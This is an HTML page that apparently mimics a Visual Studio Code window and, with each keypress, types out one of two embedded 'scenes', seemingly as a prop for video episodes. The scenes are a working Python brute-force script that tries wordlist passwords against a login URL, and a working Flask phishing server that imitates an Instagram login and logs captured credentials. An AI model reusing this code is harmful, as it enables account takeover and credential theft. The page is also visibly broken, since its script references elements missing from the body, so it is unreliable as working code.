<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Visual Studio Code</title>
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; overflow: hidden; }

body {
  background: #1e1e1e;
  color: #d4d4d4;
  font-family: 'Segoe UI', Ubuntu, sans-serif;
  font-size: 13px;
  display: flex;
  flex-direction: column;
  height: 100vh;
}

/* ── TITLE BAR ─────────────────────────────── */
.titlebar {
  background: #323233;
  height: 30px;
  display: flex; align-items: center;
  flex-shrink: 0; user-select: none;
}
.tb-dots { display: flex; gap: 7px; padding: 0 14px; }
.tb-dot  { width: 12px; height: 12px; border-radius: 50%; cursor: pointer; }
.td-r { background: #ff5f57; } .td-y { background: #ffbd2e; } .td-g { background: #28c840; }
.tb-title { flex: 1; text-align: center; font-size: 12px; color: #cccccc; }

/* ── MENU BAR ──────────────────────────────── */
.menubar {
  background: #3c3c3c; height: 24px;
  display: flex; align-items: center; padding: 0 6px; gap: 2px;
  flex-shrink: 0;
}
.mi { padding: 2px 8px; font-size: 12px; color: #cccccc; border-radius: 3px; cursor: default; }
.mi:hover { background: #5a5a5a; }

/* ── LAYOUT ────────────────────────────────── */
.vscode-body { display: flex; flex: 1; overflow: hidden; }

/* ── ACTIVITY BAR ──────────────────────────── */
.actbar {
  width: 48px; background: #333333;
  display: flex; flex-direction: column; align-items: center;
  padding-top: 2px; flex-shrink: 0;
  border-right: 1px solid #252526;
}
.ai {
  width: 48px; height: 48px;
  display: flex; align-items: center; justify-content: center;
  font-size: 21px; cursor: pointer; color: #6b6b6b; position: relative;
}
.ai:hover { color: #cccccc; }
.ai.on    { color: #cccccc; }
.ai.on::before {
  content: ''; position: absolute; left: 0;
  width: 2px; height: 100%; background: #007acc;
}

/* ── SIDEBAR ───────────────────────────────── */
.sidebar {
  width: 234px; background: #252526;
  flex-shrink: 0; display: flex; flex-direction: column;
  border-right: 1px solid #1e1e1e; overflow: hidden;
}
.sb-hdr {
  padding: 10px 14px 7px; font-size: 11px; font-weight: 700;
  letter-spacing: 1.1px; color: #bbbbbb; text-transform: uppercase; flex-shrink: 0;
}
.sb-body { flex: 1; overflow-y: auto; overflow-x: hidden; }
.sb-body::-webkit-scrollbar { width: 4px; }
.sb-body::-webkit-scrollbar-thumb { background: #424242; }

.tr {
  display: flex; align-items: center;
  height: 22px; padding-right: 6px;
  font-size: 13px; color: #cccccc;
  cursor: pointer; white-space: nowrap;
}
.tr:hover { background: #2a2d2e; }
.tr.act   { background: #37373d; }
.tr-arrow { width: 16px; text-align: center; font-size: 9px; color: #aaa; flex-shrink: 0; }
.tr-icon  { font-size: 13px; margin-right: 4px; flex-shrink: 0; }
.tr-mod   { width: 8px; height: 8px; border-radius: 50%; background: #e2c08d; margin-left: auto; flex-shrink: 0; }

/* ── EDITOR ────────────────────────────────── */
.editor-container { flex: 1; display: flex; flex-direction: column; overflow: hidden; min-width: 0; }

.tabs {
  background: #2d2d2d; display: flex; align-items: stretch;
  height: 35px; border-bottom: 1px solid #1e1e1e; flex-shrink: 0;
}
.tab {
  display: flex; align-items: center; gap: 5px;
  padding: 0 13px; font-size: 13px; cursor: pointer;
  border-right: 1px solid #1e1e1e; color: #969696;
}
.tab.on { background: #1e1e1e; color: #cccccc; border-top: 1px solid #007acc; }
.tdot { width: 8px; height: 8px; border-radius: 50%; background: #e2c08d; }
.tico { font-size: 12px; }
.tcls { font-size: 11px; color: #858585; }
.tcls:hover { color: #cccccc; }

.breadcrumb {
  background: #1e1e1e; padding: 4px 14px;
  font-size: 12px; color: #858585;
  border-bottom: 1px solid #2a2a2a; flex-shrink: 0;
}

/* ── CODE AREA ─────────────────────────────── */
.code-wrap {
  flex: 1; display: flex; overflow: auto; background: #1e1e1e;
}
.code-wrap::-webkit-scrollbar { width: 10px; height: 10px; }
.code-wrap::-webkit-scrollbar-track { background: #1e1e1e; }
.code-wrap::-webkit-scrollbar-thumb { background: #424242; border-radius: 4px; }

#gutter {
  padding: 8px 12px 8px 18px; text-align: right;
  color: #858585; font-family: 'JetBrains Mono','Fira Code','Cascadia Code','Consolas',monospace;
  font-size: 14px; line-height: 22px;
  user-select: none; flex-shrink: 0; min-width: 50px;
}
.ln { min-height: 22px; }

#code {
  padding: 8px 14px; flex: 1;
  white-space: pre; line-height: 22px; font-size: 14px;
  font-family: 'JetBrains Mono','Fira Code','Cascadia Code','Consolas','Courier New',monospace;
  color: #d4d4d4; outline: none;
}

/* ── SYNTAX COLORS (VS Code Dark+) ────────── */
.kw  { color: #569CD6; }
.kw2 { color: #C586C0; }
.fn  { color: #DCDCAA; }
.bi  { color: #DCDCAA; }
.st  { color: #CE9178; }
.cm  { color: #6A9955; }
.nm  { color: #B5CEA8; }
.id  { color: #9CDCFE; }
.op  { color: #D4D4D4; }

/* ── CURSOR ────────────────────────────────── */
.cur {
  display: inline-block; width: 2px; height: 16px;
  background: #aeafad; vertical-align: text-bottom;
  animation: blink 1.1s step-end infinite;
}
@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }

/* ── HINT ──────────────────────────────────── */
#hint {
  position: fixed; bottom: 42px; left: 50%;
  transform: translateX(-50%);
  background: #252526; border: 1px solid #454545;
  border-radius: 4px; padding: 7px 18px;
  font-size: 12px; color: #858585;
  pointer-events: none;
  animation: pulse 1.4s ease-in-out infinite alternate;
  z-index: 99;
}
@keyframes pulse { from{opacity:.4} to{opacity:1} }

/* ── TERMINAL ──────────────────────────────── */
.panel {
  height: 185px; background: #1e1e1e;
  border-top: 1px solid #2a2a2a;
  display: flex; flex-direction: column; flex-shrink: 0;
}
.panel-tabs {
  background: #2d2d2d; display: flex; align-items: stretch;
  height: 27px; border-bottom: 1px solid #1e1e1e; flex-shrink: 0;
}
.pt {
  padding: 0 13px; font-size: 12px; color: #969696;
  display: flex; align-items: center; cursor: pointer;
  border-right: 1px solid #1e1e1e;
}
.pt.on { color: #cccccc; border-top: 1px solid #007acc; background: #1e1e1e; }
.pt-actions {
  margin-left: auto; display: flex; align-items: center;
  padding: 0 8px; gap: 8px;
}
.pt-actions span { font-size: 14px; color: #858585; cursor: pointer; }
.pt-actions span:hover { color: #cccccc; }

.term-body {
  flex: 1; overflow-y: auto; padding: 5px 14px;
  font-family: 'JetBrains Mono','Fira Code','Consolas',monospace;
  font-size: 13px; line-height: 1.6;
}
.term-body::-webkit-scrollbar { width: 4px; }
.term-body::-webkit-scrollbar-thumb { background: #424242; }
.t-user  { color: #4ec9b0; } .t-host { color: #4ec9b0; }
.t-path  { color: #DCDCAA; } .t-dollar { color: #d4d4d4; }
.t-cur   {
  display: inline-block; width: 8px; height: 14px;
  background: #aeafad; vertical-align: text-bottom;
  animation: blink 1.1s step-end infinite;
}

/* ── STATUS BAR ────────────────────────────── */
.statusbar {
  height: 22px; background: #007acc;
  display: flex; align-items: center;
  font-size: 11px; color: #fff;
  padding: 0 10px; gap: 14px; flex-shrink: 0;
}
.statusbar .r { margin-left: auto; display: flex; gap: 14px; }
</style>
</head>
<body>

<!-- TITLE BAR -->

<div class="statusbar">
  <span>⎇&nbsp; main</span>
  <span>⊘ 0 &nbsp; ⚠ 0</span>

    <span>Python 3.11.6</span>

</div>

<div id="hint">Press any key to type...</div>

<script>
// ═══════════════════════════════════════════════════════════
//  SCENES  —  add new scenes here for future episodes
//  Usage:  code_editor.html?scene=phishing
//          code_editor.html?scene=brute_force   (default)
// ═══════════════════════════════════════════════════════════
const SCENES = {

  // ── SCENE 1: Brute Force ──────────────────────────────
  brute_force: {
    file:    'brute_force.py',
    project: 'azim_tools',
    tree: [
      { type:'folder', name:'core',       indent:1, open:true  },
      { type:'file',   name:'scanner.py', indent:2, dim:true   },
      { type:'file',   name:'utils.py',   indent:2, dim:true   },
      { type:'folder', name:'wordlists',  indent:1, open:true  },
      { type:'file',   name:'rockyou.txt',indent:2, dim:true   },
      { type:'file',   name:'passwords.txt',indent:2,dim:true  },
      { type:'file',   name:'brute_force.py', indent:1, active:true, modified:true },
      { type:'file',   name:'config.py',  indent:1, dim:true   },
    ],
    tabs: [
      { name:'brute_force.py', active:true, modified:true },
      { name:'config.py',      active:false               },
    ],
    lines: [
      'import requests',
      'import time',
      'from colorama import Fore, Style',
      '',
      '',
      'TARGET_URL = "http://192.168.1.10/login"',
      'USERNAME   = "admin"',
      'WORDLIST   = "wordlists/passwords.txt"',
      '',
      '',
      'def try_login(username, password):',
      '    payload = {',
      '        "username": username,',
      '        "password": password',
      '    }',
      '    try:',
      '        r = requests.post(TARGET_URL, data=payload, timeout=5)',
      '        if r.status_code == 302 or "dashboard" in r.text:',
      '            return True',
      '    except requests.exceptions.ConnectionError:',
      '        pass',
      '    return False',
      '',
      '',
      'def load_wordlist(path):',
      '    with open(path, "r", encoding="utf-8") as f:',
      '        return [line.strip() for line in f]',
      '',
      '',
      'def brute_force(username, passwords):',
      '    total = len(passwords)',
      '    print(f"[*] Target   : {TARGET_URL}")',
      '    print(f"[*] Username : {username}")',
      '    print(f"[*] Wordlist : {total} passwords")',
      '    print("-" * 40)',
      '    for i, pwd in enumerate(passwords):',
      '        print(f"  Trying [{i+1}/{total}]: {pwd}", end="\\r")',
      '        if try_login(username, pwd):',
      '            print(f"\\n[+] Found — password: {pwd}")',
      '            return pwd',
      '        time.sleep(0.05)',
      '    print("\\n[-] Password not found.")',
      '    return None',
      '',
      '',
      'if __name__ == "__main__":',
      '    words  = load_wordlist(WORDLIST)',
      '    result = brute_force(USERNAME, words)',
      '    if result:',
      '        print(f"[+] Credentials: {USERNAME}:{result}")',
    ],
  },

  // ── SCENE 2: Phishing Generator ───────────────────────
  phishing: {
    file:    'phishing_gen.py',
    project: 'azim_tools',
    tree: [
      { type:'folder', name:'templates',   indent:1, open:true  },
      { type:'file',   name:'login.html',  indent:2, dim:true   },
      { type:'file',   name:'style.css',   indent:2, dim:true   },
      { type:'folder', name:'logs',        indent:1, open:false },
      { type:'file',   name:'phishing_gen.py', indent:1, active:true, modified:true },
      { type:'file',   name:'server.py',   indent:1, dim:true   },
      { type:'file',   name:'config.py',   indent:1, dim:true   },
    ],
    tabs: [
      { name:'phishing_gen.py', active:true, modified:true },
      { name:'server.py',       active:false               },
    ],
    lines: [
      'import os',
      'import shutil',
      'from flask import Flask, request, redirect, render_template',
      'from datetime import datetime',
      '',
      '',
      'app        = Flask(__name__)',
      'LOG_FILE   = "logs/captured.txt"',
      'TARGET_URL = "https://instagram.com"',
      'CLONE_URL  = "https://instagram.com/accounts/login/"',
      '',
      '',
      'def log_credentials(username, password):',
      '    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")',
      '    entry = f"[{timestamp}]  {username}:{password}"',
      '    os.makedirs("logs", exist_ok=True)',
      '    with open(LOG_FILE, "a", encoding="utf-8") as f:',
      '        f.write(entry + "\\n")',
      '    print(f"[+] Captured  ->  {entry}")',
      '',
      '',
      '@app.route("/")',
      'def index():',
      '    return render_template("login.html")',
      '',
      '',
      '@app.route("/login", methods=["POST"])',
      'def login():',
      '    username = request.form.get("username", "")',
      '    password = request.form.get("password", "")',
      '    if username and password:',
      '        log_credentials(username, password)',
      '    return redirect(TARGET_URL)',
      '',
      '',
      '@app.route("/status")',
      'def status():',
      '    if not os.path.exists(LOG_FILE):',
      '        return "No credentials captured yet."',
      '    with open(LOG_FILE, "r") as f:',
      '        return f"<pre>{f.read()}</pre>"',
      '',
      '',
      'if __name__ == "__main__":',
      '    print("[*] Phishing server starting...")',
      '    print(f"[*] Logs  -> {LOG_FILE}")',
      '    print(f"[*] Redirect -> {TARGET_URL}")',
      '    app.run(host="0.0.0.0", port=8080, debug=False)',
    ],
  },

};

// ═══════════════════════════════════════════════════════════
//  LOAD SCENE
// ═══════════════════════════════════════════════════════════
const params    = new URLSearchParams(window.location.search);
const sceneName = params.get('scene') || 'brute_force';
const scene     = SCENES[sceneName] || SCENES['brute_force'];

// Title bar
document.getElementById('winTitle').textContent =
  `${scene.file} — ${scene.project} — Visual Studio Code`;
document.title = document.getElementById('winTitle').textContent;

// ── File tree ────────────────────────────────
const treeEl = document.getElementById('fileTree');
let treeHTML = `
  <div class="tr" style="padding-left:4px">
    <div class="tr-arrow">▾</div>
    <span style="font-weight:700;color:#bbb;font-size:12px;letter-spacing:.5px">
      ${scene.project.toUpperCase()}
    </span>
  </div>`;

for (const item of scene.tree) {
  const pad = item.indent * 14 + 'px';
  const dim = item.dim ? 'color:#888' : '';
  if (item.type === 'folder') {
    const arrow = item.open ? '▾' : '▸';
    treeHTML += `
      <div class="tr" style="padding-left:${pad}">
        <div class="tr-arrow">${arrow}</div>
        <span class="tr-icon">📁</span>
        <span>${item.name}</span>
      </div>`;
  } else {
    const activeClass = item.active ? 'act' : '';
    const mod = item.modified
      ? '<div class="tr-mod"></div>' : '';
    treeHTML += `
      <div class="tr ${activeClass}" style="padding-left:${pad}">
        <div class="tr-arrow"></div>
        <span class="tr-icon">🐍</span>
        <span style="${dim}">${item.name}</span>
        ${mod}
      </div>`;
  }
}
treeEl.innerHTML = treeHTML;

// ── Tabs ─────────────────────────────────────
const tabBar = document.getElementById('tabBar');
tabBar.innerHTML = scene.tabs.map(t => `
  <div class="tab ${t.active ? 'on' : ''}">
    ${t.modified ? '<span class="tdot"></span>' : ''}
    <span class="tico">🐍</span>
    ${t.name}
    <span class="tcls">×</span>
  </div>`).join('');

// ── Breadcrumb ───────────────────────────────
document.getElementById('breadcrumb').innerHTML =
  `${scene.project} &nbsp;›&nbsp; <span style="color:#ccc">${scene.file}</span>`;

// ── Terminal prompt ───────────────────────────
document.getElementById('termBody').innerHTML = `
  <span class="t-user">azim</span><span style="color:#858">@</span>
  <span class="t-host">kali</span><span class="t-dollar">:</span>
  <span class="t-path">~/${scene.project}</span>
  <span class="t-dollar">$ </span>
  <span class="t-cur"></span>`;

// ═══════════════════════════════════════════════════════════
//  TOKENIZER
// ═══════════════════════════════════════════════════════════
const KW  = new Set(['def','class','if','else','elif','for','while','in',
  'return','True','False','None','try','except','with','as','pass',
  'break','continue','not','and','or','is','del','raise','lambda',
  'yield','global','nonlocal','assert','finally','self']);
const KW2 = new Set(['import','from']);
const BI  = new Set(['print','len','range','str','int','float','list',
  'dict','set','open','type','isinstance','enumerate','zip','map',
  'filter','sorted','sum','min','max','input','repr','format','bytes',
  'bool','tuple','hasattr','getattr','setattr','any','all','next',
  'iter','vars','dir','id','hex','oct','bin','abs','round','exists',
  'makedirs','strftime']);

function tokenize(code) {
  const out = [];
  let i = 0;
  const push = (text, cls) => { if (text) out.push({text, cls}); };

  while (i < code.length) {
    const ch = code[i];

    // f-string
    if ((ch === 'f' || ch === 'F') && i+1 < code.length &&
        (code[i+1] === '"' || code[i+1] === "'")) {
      const q = code[i+1]; let s = ch+q; i += 2;
      while (i < code.length && code[i] !== q && code[i] !== '\n') {
        if (code[i] === '\\' && i+1 < code.length) s += code[i++];
        s += code[i++];
      }
      if (i < code.length && code[i] === q) s += code[i++];
      push(s, 'st'); continue;
    }

    // string
    if (ch === '"' || ch === "'") {
      const q = ch;
      if (i+2 < code.length && code[i+1]===q && code[i+2]===q) {
        let s = q+q+q; i += 3;
        while (i < code.length) {
          if (code[i]===q && i+2<code.length && code[i+1]===q && code[i+2]===q)
            { s += q+q+q; i += 3; break; }
          s += code[i++];
        }
        push(s, 'st'); continue;
      }
      let s = q; i++;
      while (i < code.length && code[i] !== q && code[i] !== '\n') {
        if (code[i] === '\\' && i+1 < code.length) s += code[i++];
        s += code[i++];
      }
      if (i < code.length && code[i] === q) s += code[i++];
      push(s, 'st'); continue;
    }

    // comment
    if (ch === '#') {
      let s = '';
      while (i < code.length && code[i] !== '\n') s += code[i++];
      push(s, 'cm'); continue;
    }

    // identifier / keyword
    if (/[a-zA-Z_]/.test(ch)) {
      let w = '';
      while (i < code.length && /[a-zA-Z0-9_]/.test(code[i])) w += code[i++];
      if      (KW2.has(w)) push(w, 'kw2');
      else if (KW.has(w))  push(w, 'kw');
      else if (BI.has(w))  push(w, 'bi');
      else {
        let isDef = false;
        for (let k = out.length-1; k >= 0; k--) {
          if (out[k].text.trim()) { isDef = out[k].text === 'def'; break; }
        }
        let j = i; while (j < code.length && code[j] === ' ') j++;
        push(w, isDef || code[j] === '(' ? 'fn' : 'id');
      }
      continue;
    }

    // number
    if (/[0-9]/.test(ch)) {
      let n = '';
      while (i < code.length && /[0-9.eE]/.test(code[i])) n += code[i++];
      push(n, 'nm'); continue;
    }

    push(ch, 'op'); i++;
  }
  return out;
}

function expand(tokens) {
  const arr = [];
  for (const {text, cls} of tokens)
    for (const ch of text) arr.push({ch, cls});
  return arr;
}

const CODE  = scene.lines.join('\n');
const CHARS = expand(tokenize(CODE));

// ═══════════════════════════════════════════════════════════
//  DOM TYPING
// ═══════════════════════════════════════════════════════════
const codeEl = document.getElementById('code');
const gutter = document.getElementById('gutter');
const cursor = document.getElementById('cur');
const hintEl = document.getElementById('hint');
const slEl   = document.getElementById('sl');

let lineCount = 1;
let colCount  = 1;
let lastSpan  = null;
let idx       = 0;

function updateGutter() {
  let h = '';
  for (let n = 1; n <= lineCount; n++) h += `<div class="ln">${n}</div>`;
  gutter.innerHTML = h;
}

function addChar(ch, cls) {
  if (ch === '\n') {
    const sp = document.createElement('span');
    sp.className = 'op'; sp.textContent = '\n';
    codeEl.insertBefore(sp, cursor);
    lastSpan = sp;
    lineCount++; colCount = 1;
    updateGutter();
  } else {
    if (lastSpan && lastSpan.className === cls) {
      lastSpan.textContent += ch;
    } else {
      const sp = document.createElement('span');
      sp.className = cls; sp.textContent = ch;
      codeEl.insertBefore(sp, cursor);
      lastSpan = sp;
    }
    colCount++;
  }
  slEl.textContent = `Ln ${lineCount}, Col ${colCount}`;
  cursor.scrollIntoView({block: 'nearest'});
}

// ═══════════════════════════════════════════════════════════
//  KEYPRESS  →  1 KEYPRESS = 1 CHARACTER
// ═══════════════════════════════════════════════════════════
const SKIP = new Set([
  'Shift','Control','Alt','Meta','CapsLock','Tab',
  'ArrowUp','ArrowDown','ArrowLeft','ArrowRight',
  'Escape','Home','End','PageUp','PageDown',
  'Insert','PrintScreen','ScrollLock','Pause',
  'ContextMenu','NumLock','F1','F2','F3','F4','F5',
  'F6','F7','F8','F9','F10','F11','F12',
]);

document.addEventListener('keydown', e => {
  if (SKIP.has(e.key)) return;

  if (idx === 0) hintEl.style.display = 'none';

  if (idx < CHARS.length) {
    addChar(CHARS[idx].ch, CHARS[idx].cls);
    idx++;
  }

  // Finished typing
  if (idx >= CHARS.length) {
    cursor.style.display = 'none';
  }
});
</script>
